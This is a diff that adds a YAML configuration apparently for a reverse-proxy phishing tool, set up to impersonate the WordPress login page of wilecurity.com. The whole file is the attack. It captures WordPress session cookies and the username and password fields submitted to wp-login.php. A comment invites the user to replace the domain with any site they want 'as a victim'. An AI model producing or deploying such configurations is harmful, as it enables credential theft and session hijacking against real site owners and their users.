@@ -1,0 +1,36 @@
+---
+name: 'Wilecurity WordPress'
+author: 'wilecurity'
+min_ver: '2.5'
+
+proxy_hosts:
+    - phish_sub: ''
+      orig_sub: ''
+      domain: 'wilecurity.com'
+      session: true
+      is_landing: true
+
+sub_filters: []
+
+# Standard WordPress authentication cookies for self-hosted sites.
+# The regex matches any cookie that starts with 'wordpress_sec_' or 'wordpress_logged_in_'.
+auth_tokens:
+    - domain: '.wilecurity.com'
+      keys:
+          - 'wordpress_sec_.*,regexp'
+          - 'wordpress_logged_in_.*,regexp'
+
+credentials:
+    username:
+        key: 'log'
+        search: '(.*)'
+        type: 'post'
+    password:
+        key: 'pwd'
+        search: '(.*)'
+        type: 'post'
+
+# change domain to your preffered domain name, change the wilecurity.com to any domain you want as a victim.
+login:
+    domain: 'wilecurity.com'
+    path: '/wp-login.php'
